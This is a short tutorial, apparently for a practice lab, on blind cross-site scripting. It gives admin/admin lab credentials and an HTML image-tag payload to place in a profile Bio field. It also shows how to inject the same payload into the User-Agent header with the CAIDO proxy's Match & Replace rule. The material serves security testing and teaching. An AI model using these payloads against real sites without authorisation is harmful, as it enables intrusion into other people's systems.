# Blind XSS

**Blind XSS** is a attack where the malicious payload is executed in a different context or by a different user (often an admin), making it invisible to the attacker during injection and requiring out-of-band detection.

---

### Login Credentials

- **Username:** `admin`  
- **Password:** `admin`

### Blind XSS via User Profile

1. Register a new user account and log in.
2. Navigate to the user profile section.
3. In the `Bio` input field, enter the following **XSS payload**:

    ```html
    </textarea><img src=x onclick=alert(1)>test123
    ```

4. Log in as the administrator.
5. View the user profile — if vulnerable, the payload will execute when the profile is viewed.


### Blind XSS via HTTP Headers (Using CAIDO)

1. Open **CAIDO** proxy tool.
2. Go to `Match & Replace`.
3. Create a new rule with the following settings:
   - **Name:** `bxss`
   - **Strategy:** `Request Header`
   - **Search term:** `Mozilla/5.0`
   - **Replace term:**

     ```html
     Mozilla/5.0 </textarea><img src=x onclick=alert('xss')>
     ```

4. Before sending a request, you might have something like:

    ```http
    GET /path/?query=value HTTP/1.1
    Host: example.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
    ```

5. After applying the `Match & Replace` rule and sending the request:

    ```http
    GET /path/?query=value HTTP/1.1
    Host: example.com
    User-Agent: Mozilla/5.0 </textarea><img src=x onclick=alert('xss')> (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
    ```

6. Monitor for any XSS triggers — such as alerts on the admin panel — which indicate Blind XSS via headers.

